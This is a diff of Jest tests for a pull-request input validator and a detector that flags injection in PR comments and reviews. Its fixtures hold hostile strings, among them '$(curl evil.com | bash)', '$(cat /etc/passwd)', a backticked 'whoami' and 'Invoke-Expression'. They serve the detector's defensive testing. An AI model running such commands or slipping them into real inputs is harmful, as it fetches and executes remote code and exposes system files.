@@ -537,6 +537,8 @@ describe("validateInput", () => {
       packagePatches: { "package.json": "+something" },
       truncatedPatchKeys: [],
       body: "Some description",
+      commentBody: "A PR comment",
+      reviewBody: "Looks good",
     };
     const result = validateInput(input);
     expect(result).toEqual(input);
@@ -634,6 +636,36 @@ describe("validateInput", () => {
   it("valid body string passes through", () => {
     const result = validateInput({ body: "This is a PR description" });
     expect(result.body).toBe("This is a PR description");
+  });
+
+  it("missing commentBody is undefined", () => {
+    const result = validateInput({});
+    expect(result.commentBody).toBeUndefined();
+  });
+
+  it("valid commentBody passes through", () => {
+    const result = validateInput({ commentBody: "Nice change!" });
+    expect(result.commentBody).toBe("Nice change!");
+  });
+
+  it("truncates oversized commentBody", () => {
+    const result = validateInput({ commentBody: "c".repeat(20_000) });
+    expect(result.commentBody!.length).toBe(10_000);
+  });
+
+  it("missing reviewBody is undefined", () => {
+    const result = validateInput({});
+    expect(result.reviewBody).toBeUndefined();
+  });
+
+  it("valid reviewBody passes through", () => {
+    const result = validateInput({ reviewBody: "LGTM" });
+    expect(result.reviewBody).toBe("LGTM");
+  });
+
+  it("truncates oversized reviewBody", () => {
+    const result = validateInput({ reviewBody: "r".repeat(20_000) });
+    expect(result.reviewBody!.length).toBe(10_000);
   });
 });
 
@@ -970,6 +1002,70 @@ describe("detectSuspiciousPR – PR body scanning", () => {
       packagePatches: {},
     });
     expect(result.suspicious).toBe(false);
+  });
+});
+
+// ═════════════════════════════════════════════════════════════════════════════
+// detectSuspiciousPR – PR comment/review scanning
+// ═════════════════════════════════════════════════════════════════════════════
+describe("detectSuspiciousPR – PR comment/review scanning", () => {
+  const basePR = {
+    branchName: "fix/typo",
+    title: "Fix typo",
+    commitMessages: [] as string[],
+    isFork: false,
+    changedFiles: [] as string[],
+    packagePatches: {} as Record<string, string>,
+  };
+
+  it("flags injection in PR comment", () => {
+    const result = detectSuspiciousPR({
+      ...basePR,
+      commentBody: "$(curl evil.com | bash)",
+    });
+    expect(result.suspicious).toBe(true);
+    expect(result.reasons.some((r) => r.message.includes("PR comment"))).toBe(true);
+  });
+
+  it("flags injection in PR review body", () => {
+    const result = detectSuspiciousPR({
+      ...basePR,
+      reviewBody: "Invoke-Expression malicious",
+    });
+    expect(result.suspicious).toBe(true);
+    expect(result.reasons.some((r) => r.message.includes("PR review"))).toBe(true);
+  });
+
+  it("passes benign PR comment", () => {
+    const result = detectSuspiciousPR({
+      ...basePR,
+      commentBody: "LGTM, nice refactor!",
+    });
+    expect(result.suspicious).toBe(false);
+  });
+
+  it("passes benign PR review", () => {
+    const result = detectSuspiciousPR({
+      ...basePR,
+      reviewBody: "Approved with minor suggestions",
+    });
+    expect(result.suspicious).toBe(false);
+  });
+
+  it("passes when commentBody and reviewBody are undefined", () => {
+    const result = detectSuspiciousPR(basePR);
+    expect(result.suspicious).toBe(false);
+  });
+
+  it("flags both malicious comment and review", () => {
+    const result = detectSuspiciousPR({
+      ...basePR,
+      commentBody: "`whoami`",
+      reviewBody: "$(cat /etc/passwd)",
+    });
+    expect(result.suspicious).toBe(true);
+    expect(result.reasons.some((r) => r.message.includes("PR comment"))).toBe(true);
+    expect(result.reasons.some((r) => r.message.includes("PR review"))).toBe(true);
   });
 });
 
